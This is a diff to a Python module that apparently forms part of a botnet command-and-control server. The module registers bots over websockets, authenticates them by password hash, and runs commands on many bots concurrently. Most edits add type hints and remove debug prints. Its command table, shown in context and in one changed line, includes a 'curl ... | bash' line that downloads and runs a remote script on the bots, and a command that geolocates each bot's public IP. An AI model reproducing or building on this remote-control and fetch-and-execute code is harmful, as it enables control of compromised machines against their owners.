@@ -43,7 +43,7 @@ class Context:
             return None
 
 
-    async def add_bot(self, ws: WebSocketConn):
+    async def add_bot(self, ws: WebSocketConn) -> Bot: 
         # First the client sends logged in user
         user = await ws.recv()
         try:
@@ -96,18 +96,18 @@ class CommandControl:
     def __init__(self, ctx: Context):
         self.ctx = ctx
 
-    def optionalCommands(self, cmd):
+    def optionalCommands(self, cmd: str) -> str | None:
         match cmd:
             case "city":
                 return "curl http://ipinfo.io/$(curl ifconfig.io) | grep region | sed 's/.$//'"
             case "neofetch":
-                return "curl https://raw.githubusercontent.com/Chocapikk/neofetch/master/neofetch | bash || neofetch"
+                return "(curl https://raw.githubusercontent.com/Chocapikk/neofetch/master/neofetch | bash || neofetch)"
             
             case default:
                 return None
 
 
-    async def bot_authenticated(self, ws: WebSocketConn):
+    async def bot_authenticated(self, ws: WebSocketConn) -> str:
         pass_hash = await ws.recv()
         return pass_hash == self.ctx.pass_hash
 
@@ -149,9 +149,6 @@ class CommandControl:
 
         # Execute all commands simultaneously in case it takes long time to
         # finish
-        print(f'Longueur de la chaine : {len(idxs)}')
-        print(f'Contenu de la chaine : {idxs}')
-        print(f'Test de print de la longueur des bots : {self.ctx.getLenBots()}')
         try:
             await asyncio.gather(*[exec_command(i) for i in idxs])
         except OSError:
